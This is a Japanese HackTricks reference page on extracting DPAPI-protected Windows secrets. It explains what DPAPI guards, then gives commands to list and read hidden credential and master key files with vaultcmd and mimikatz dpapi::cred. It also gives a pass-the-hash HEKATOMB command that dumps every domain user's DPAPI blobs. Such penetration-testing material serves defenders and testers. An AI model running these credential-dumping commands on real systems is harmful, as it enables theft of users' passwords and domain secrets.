# DPAPI - パスワードの抽出

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFT](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に**参加**するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングトリックを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/)は**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**でも最も重要なイベントの1つです。**技術的知識の促進を使命**とするこの会議は、あらゆる分野のテクノロジーとサイバーセキュリティ専門家にとっての熱い出会いの場です。

{% embed url="https://www.rootedcon.com/" %}

## DPAPIとは

Data Protection API（DPAPI）は、Windowsオペレーティングシステム内で**非対称プライベートキーの対称暗号化**に主に使用され、ユーザーまたはシステムの秘密をエントロピーの重要なソースとして活用します。このアプローチにより、開発者はユーザーのログオン秘密から派生したキーを使用してデータを暗号化できるため、システムのドメイン認証秘密を使用する場合、開発者が暗号化キーの保護を管理する必要がなくなります。

### DPAPIによって保護されるデータ

DPAPIによって保護される個人データには、次のものがあります：

* Internet ExplorerおよびGoogle Chromeのパスワードおよび自動入力データ
* OutlookやWindows Mailなどのアプリケーションの電子メールおよび内部FTPアカウントのパスワード
* 共有フォルダ、リソース、ワイヤレスネットワーク、Windows Vaultのパスワード（暗号化キーを含む）
* リモートデスクトップ接続、.NET Passport、およびさまざまな暗号化および認証目的のプライベートキーのパスワード
* Credential Managerで管理されるネットワークパスワード、およびSkype、MSNメッセンジャーなどのCryptProtectDataを使用するアプリケーションでの個人データ

## Vaultのリスト
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## 資格情報ファイル

**保護された資格情報ファイル**は次の場所にある可能性があります：
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Mimikatzを使用して資格情報情報を取得するには、`dpapi::cred`を使用します。応答には、暗号化されたデータとguidMasterKeyなどの興味深い情報が含まれています。
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
次のように、適切な `/masterkey` を使用して **mimikatz module** `dpapi::cred` を使って復号化することができます:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## マスターキー

ユーザーのRSAキーを暗号化するために使用されるDPAPIキーは、`%APPDATA%\Microsoft\Protect\{SID}`ディレクトリの下に保存されます。ここで、{SID}はそのユーザーの[**セキュリティ識別子**](https://en.wikipedia.org/wiki/Security\_Identifier)です。**DPAPIキーは、ユーザーのプライベートキーを保護するマスターキーと同じファイルに保存されます**。通常、これはランダムな64バイトのデータです。（このディレクトリは保護されているため、cmdから`dir`を使用してリストすることはできませんが、PSからはリストできます）。
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
これはユーザーの一連のマスターキーが見えるようになります：

![](<../../.gitbook/assets/image (1121).png>)

通常、**各マスターキーは他のコンテンツを復号化できる暗号化された対称キー**です。したがって、**暗号化されたマスターキーを抽出**して、後でそれで**暗号化された他のコンテンツ**を**復号化**することが興味深いです。

### マスターキーの抽出と復号化

マスターキーを抽出して復号化する方法の例については、[https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)を参照してください。

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1)は、[@gentilkiwi](https://twitter.com/gentilkiwi)の[Mimikatz](https://github.com/gentilkiwi/mimikatz/)プロジェクトからの一部のDPAPI機能のC#ポートです。

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB)は、LDAPディレクトリからすべてのユーザーとコンピュータを抽出し、RPCを介してドメインコントローラーバックアップキーを抽出するツールです。スクリプトはその後、すべてのコンピュータのIPアドレスを解決し、すべてのユーザーのDPAPIブロブを取得し、ドメインバックアップキーですべてを復号化します。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAPコンピュータリストから抽出された場合、それらを知らなくてもすべてのサブネットワークを見つけることができます！

"ドメイン管理者権限だけでは不十分です。すべてをハックしましょう。"

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI)は、DPAPIで保護されたシークレットを自動的にダンプできます。

## 参考文献

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)は、**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**で最も重要なイベントの1つです。**技術的知識の促進を使命**とするこの会議は、あらゆる分野の技術とサイバーセキュリティ専門家にとっての熱い出会いの場です。

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または**最新バージョンのPEASSにアクセス**したいですか？またはHackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つけてください
* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* **💬**[**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングトリックを共有するために**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と**[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
